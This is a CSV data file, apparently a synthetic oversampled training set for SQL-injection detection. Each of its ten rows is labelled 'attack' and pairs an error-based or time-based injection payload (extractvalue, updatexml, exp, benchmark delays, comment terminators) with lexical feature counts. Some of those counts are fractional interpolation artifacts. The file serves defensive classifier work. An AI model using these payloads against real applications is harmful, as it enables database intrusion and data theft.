id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"1'+  (  select 'vbqo' where 5630  =  5630 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000047,1.0533362334241718,186.3744995632415,37.10956266378443,4.0345680250233,64.7031875545948,31.296812445405187,66.78087467243114,23.59362489081038,0.3473461288053314,0.16794055716412104,0.3581674158773956,0.12654589815315204,3.2968124454051893,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.29681244540519,0.0,0.0,4.0,2.2968124454051893,1.0,0.0,0.0,0.703187554594811,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000002,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000224,0.7758042461127853,138.31113092697393,25.0,3.6394772426649427,33.93339278092181,37.755476292104255,49.622261853947876,17.0,0.24531023267527213,0.2730227099446566,0.35875439059655323,0.12291266678351805,0.31113092697393596,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.688869073026064,1.0,0.3111309269739361,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000003,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R000155,0.23980289018086948,185.87774223587948,29.87774223587949,3.651434560594533,51.510968943517966,35.0,75.24451552824102,24.12225776412051,0.2771112358973731,0.18829639702831205,0.40481398490444254,0.12977838216987234,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.1222577641205087,0.0,14.0,0.0,0.0,5.0,1.122257764120509,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000004,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R000234,0.5363023974587114,189.1439571913939,29.0,3.538396011811573,47.0,32.0,81.51516575311513,28.628791438278782,0.24863490267732297,0.169283337993071,0.43075071900261397,0.1513310403269921,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,14.62879143827878,1.9999999999999998,0.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000005,attack,error,"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000129,0.0910084333295075,161.0,29.060586136521003,3.81094354911121,40.81824159043699,43.24234454608401,56.878827726957994,20.060586136521003,0.2535294508722794,0.26858599096946595,0.3532846442668198,0.12459991389143481,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.060586136521004,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000006,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000156,0.518893665404159,138.0,24.32326919625708,3.6025743865153954,35.03019241122877,36.29307678502831,50.35346160748584,16.32326919625708,0.25384197399441133,0.26299331003643706,0.3648801565759844,0.11828455939316723,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.323269196257079,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R000099,0.36486187308395135,186.10156248473004,28.0,3.558762419685256,47.0,35.0,78.68124998778401,25.420312496946003,0.2526677096374297,0.18815680504914975,0.42261120815856257,0.13656427715485808,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,14.420312496946005,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000008,attack,error,"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000199,0.8458828517055843,161.08041115158292,33.451546043309406,3.69722679754492,50.0,23.0,66.90309208661881,21.17731906496411,0.31052302353393324,0.1428405908256093,0.4152798510229364,0.13135653461752106,0.7257730216547035,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,14.725773021654703,0.7257730216547036,0.0,4.0,0.0,0.7257730216547034,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,error,"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000134,0.6957798649959017,169.9926886135925,29.899268861359246,3.7750669808149464,43.697806584077746,43.0,62.395613168155485,20.899268861359246,0.2569111089831929,0.25381127585242524,0.36625752270334794,0.12302009246103392,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.899268861359248,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000010,attack,error,"1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000138,0.8143412178293129,169.4016950885946,33.31440679204247,3.893083953978815,55.88644075225483,32.0,61.88644075225483,19.628813584084945,0.32976371049053455,0.1891703320523099,0.36523314775034266,0.11583280970681288,0.3144067920424716,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,12.314406792042472,0.0,0.0,4.0,3.0,0.31440679204247174,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
